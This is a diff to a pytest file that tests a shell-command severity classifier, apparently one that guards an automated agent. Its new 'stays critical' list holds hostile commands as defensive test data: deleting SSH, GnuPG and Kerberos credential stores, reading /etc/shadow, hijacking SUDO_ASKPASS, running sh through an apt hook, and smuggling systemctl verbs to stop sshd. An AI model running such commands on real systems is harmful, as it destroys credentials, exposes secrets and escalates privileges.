@@ -211,9 +211,9 @@ def test_sudo_running_a_shell_is_critical(command):
 @pytest.mark.parametrize("command", [
     "sudo apt update", "sudo -n apt-get install -y php-cli", "sudo dnf install x",
     "sudo -v", "sudo -l", "sudo -k", "pkexec", "pkexec --user root",
-    "doas pacman -Syu", "sudo systemctl is-active nginx", "sudo lsof -i :8080",
-    "sudo -u root -g wheel -H -n -- apt update", "sudo --user root apt install foo",
-    "sudo --chdir /tmp apt update", "sudo snap install x", "sudo umount /mnt/x",
+    "doas pacman -Syu", "sudo systemctl is-active nginx",
+    "sudo -u root -g wheel -H -n apt update", "sudo --user root apt install foo",
+    "sudo snap install x",
 ])
 def test_plain_sudo_is_high(command):
     assert _sev(command, PRIVILEGE) == HIGH
@@ -383,7 +383,7 @@ def test_qa2_sudo_stays_critical(command):
 
 @pytest.mark.parametrize("command", [
     "sudo apt install foo", "sudo -l", "sudo -n apt-get install -y php",
-    "sudo --user=root apt update", "sudo systemctl --no-pager status x",
+    "sudo --user=root apt update", "sudo systemctl status --no-pager x",
 ])
 def test_qa2_plain_sudo_is_high(command):
     assert _sev(command, PRIVILEGE) == HIGH
@@ -532,7 +532,7 @@ def test_probe5_privilege_stays_critical(command):
 @pytest.mark.parametrize("command", [
     "sudo apt update", "sudo apt-get update", "sudo apt install -y x",
     "sudo apt-get install -y python3", "sudo apt-get update -y -q", "sudo dnf install x",
-    "sudo pacman -Syu", "sudo apt-get install --no-install-recommends x", "sudo umount /mnt/x",
+    "sudo pacman -Syu", "sudo apt-get install --no-install-recommends x",
 ])
 def test_probe5_plain_package_commands_are_high(command):
     assert _sev(command, PRIVILEGE) == HIGH
@@ -569,12 +569,12 @@ def test_probe5_rm_and_chmod_stay_critical(command):
 # --- sprint 44 QA: systemctl read-only verbs only; safe-path characters pinned ---
 
 @pytest.mark.parametrize("command", [
-    "sudo systemctl --no-pager status x", "sudo systemctl status --no-pager x",
-    "sudo systemctl --no-pager show x", "sudo systemctl --no-pager cat x",
-    "sudo systemctl --no-pager list-units", "sudo systemctl --no-pager list-unit-files",
-    "sudo systemctl --no-pager help x", "sudo systemctl is-active x",
-    "sudo systemctl is-enabled x", "sudo systemctl is-failed x",
-    "sudo systemctl --quiet is-active x",
+    "sudo systemctl status --no-pager x", "sudo systemctl status x --no-pager",
+    "sudo systemctl show --no-pager x", "sudo systemctl cat x --no-pager",
+    "sudo systemctl list-units --no-pager", "sudo systemctl list-unit-files --no-pager",
+    "sudo systemctl is-active x", "sudo systemctl is-enabled x",
+    "sudo systemctl is-failed x", "sudo systemctl is-active --quiet x",
+    "sudo systemctl status --no-pager --full -l x.service",
 ])
 def test_systemctl_read_only_verbs_are_high(command):
     assert _sev(command, PRIVILEGE) == HIGH
@@ -751,7 +751,97 @@ def test_unknown_sudo_options_stay_critical(command):
 
 @pytest.mark.parametrize("command", [
     "sudo -n apt update", "sudo -u root apt update", "sudo --user=root apt update",
-    "sudo -D /tmp apt update", "sudo --non-interactive apt update", "sudo -k",
+    "sudo --non-interactive apt update", "sudo -k",
 ])
 def test_known_sudo_options_still_high(command):
     assert _sev(command, PRIVILEGE) == HIGH
+
+
+# --- QA #223 round 6: a narrower allowlist ------------------------------------
+
+_QA6_CRITICAL = [
+    # P1 systemctl: an option before the verb could take the verb as its value
+    "sudo systemctl -p is-active stop sshd", "sudo systemctl --property is-active stop sshd",
+    "sudo systemctl -t is-x restart sshd", "sudo systemctl -n is-x disable sshd",
+    "sudo systemctl -o is-x mask sshd", "sudo systemctl -s is-x kill sshd",
+    "sudo systemctl -H is-x poweroff", "sudo systemctl --state is-x isolate rescue.target",
+    "sudo systemctl -p status --no-pager stop sshd",
+    "sudo systemctl -p list-units --no-pager reboot",
+    "sudo systemctl --what is-x clean sshd", "sudo systemctl -p is-active enable --now evil",
+    "sudo systemctl help sshd --no-pager", "sudo systemctl --no-pager status x",
+    "sudo systemctl --quiet is-active x", "sudo systemctl status x --no-pager -p Id",
+    "sudo systemctl status --no-pager ../x",
+    # P2 package managers: only install/update/upgrade (+ dnf/yum info/list)
+    "sudo snap try mydir", "sudo snap try --devmode mydir", "sudo dnf builddep evil.spec",
+    "sudo dnf -y builddep evil.spec", "sudo yum install evil.spec", "sudo zypper ar x.repo",
+    "sudo zypper addrepo evil.repo", "sudo apt install x.udeb", "sudo apt-get install -y x.ddeb",
+    "sudo snap ack x.assert", "sudo apt-get install -o Dpkg::Pre-Invoke::=sh x",
+    "sudo apt-get install --allow-unauthenticated x", "sudo apt-get install ./x.deb",
+    "sudo apt install http://e.vil/x.deb", "sudo apt install x.deb",
+    "sudo apt install pkg -t experimental", "sudo pacman -S x --overwrite", "sudo pacman -U x",
+    "sudo flatpak install x --bundle", "sudo snap install x --devmode",
+    "sudo snap install x --jailmode", "sudo apt-get install -y -- x",
+    "sudo dnf install x --enablerepo=evil", "sudo dnf history undo 3",
+    "sudo apt-get purge -y systemd", "sudo apt-get remove -y sudo",
+    "sudo apt autoremove -y --purge", "sudo dnf remove -y kernel", "sudo apt show x",
+    "sudo apt list", "sudo apt search x", "sudo apt", "sudo dnf erase x",
+    # P3 umount, ss, lsof are no longer allowlisted
+    "sudo umount -a", "sudo umount -l -a -f", "sudo umount /mnt/x", "sudo ss -K dst 10.0.0.1",
+    "sudo lsof +L1", "sudo netstat -c 1", "sudo netstat --x=1",
+    # sudo options outside the safe list
+    "sudo -- apt update", "sudo -D / apt update", "sudo --chdir=/ apt update",
+    "sudo -U root apt update", "sudo --close-from=3 apt update", "sudo -A apt update",
+    "sudo -r unconfined_r apt update", "doas -C /etc/doas.conf apt update",
+    "SUDO_ASKPASS=/tmp/evil sudo -A apt update",
+    "export SUDO_ASKPASS=/tmp/evil; sudo -A apt update", "sudo -p x apt update",
+    "sudo -b apt update", "sudo -S apt update", "sudo -P apt update", "sudo - apt update",
+    # P4 credential stores
+    "rm -rf .config/gh", "rm -rf .claude", "rm -rf .mozilla", "rm -rf .cargo/credentials",
+    "rm -rf .terraform.d", "rm -rf .zsh_history", "rm -rf .bash_history",
+    "rm -rf ./.python_history", "rm -rf .gnupg.bak", "rm -rf .ssh.old",
+    "rm -rf /tmp/krb5cc_1000", "rm -rf /tmp/ssh-abc", "rm -rf /tmp/ssh-abc/agent.1",
+    "rm -rf /tmp/.X11-unix", "rm -rf /var/tmp/krb5cc_0", "cd /home/u/.config && rm -rf ./gh",
+    "cd /home/u/p && rm -rf ./.config", "chmod 600 .ssh/id_rsa", "chmod 777 .config/x",
+    # what else is on the line
+    "export CDPATH=/etc; cd x && rm -rf ./y", "CDPATH=/ cd x && rm -rf ./y",
+    "farm -rf / && rm -rf ./x", "rm -rf ./x && farm -rf /",
+    "rm -rf ./x && unlink /etc/passwd", "rm -rf ./x; cat /etc/shadow",
+    "rm -rf ./x && mv ~/.bashrc x", "rm -rf ./x 2>/etc/x", "rm -rf ./x && ls /usr/bin",
+    "cd /etc && chmod 777 ./shadow", "cd / && chmod 755 ./etc", "xchmod 755 x && chmod 755 y",
+    "chmod 755 build && cat /etc/passwd", "chmod 777 .bashrc", "chmod 666 ./.profile",
+    "chmod 644 ./.m2/settings.xml", "rm -rf ./.zshrc",
+]
+
+
+@pytest.mark.parametrize("command", _QA6_CRITICAL)
+def test_qa6_stays_critical(command):
+    assert CRIT in _sigs(command).values()
+
+
+@pytest.mark.parametrize("command", [
+    "sudo systemctl is-active sshd", "sudo systemctl status sshd --no-pager",
+    "sudo -nu root apt update", "sudo -l", "pkexec --user root apt update",
+    "sudo service sshd status", "sudo pacman -Syu", "sudo apt-get --yes install x",
+    "sudo netstat -tulpn", "sudo dnf info x", "sudo yum list", "sudo flatpak update",
+    "sudo zypper install x", "sudo apt upgrade -y", "sudo apt install libstdc++6 python3.12",
+])
+def test_qa6_allowlisted_sudo_is_high(command):
+    assert _sev(command, PRIVILEGE) == HIGH
+
+
+@pytest.mark.parametrize("command", [
+    "rm -rf ./build", "rm -rf .git", "rm -rf .venv", "cd /home/u/proj && rm -rf ./x",
+    "cd /Users/u/Documents && rm -rf ./thesis",
+    "cd /Users/u/a/b; rm -rf .venv; ls -a | head -30", "rm -rf /tmp/x && ls /tmp/y",
+])
+def test_qa6_safe_rm_is_high(command):
+    assert _sev(command, DANGEROUS) == HIGH
+
+
+@pytest.mark.parametrize("command", [
+    "chmod 755 build", "chmod 777 /tmp/x", "chmod 1777 build", "chmod 755 -R build",
+    "cd /home/u/p/q && chmod 755 ./x",
+])
+def test_qa6_safe_chmod_is_medium(command):
+    assert _sev(command, PRIVILEGE) == MED
+
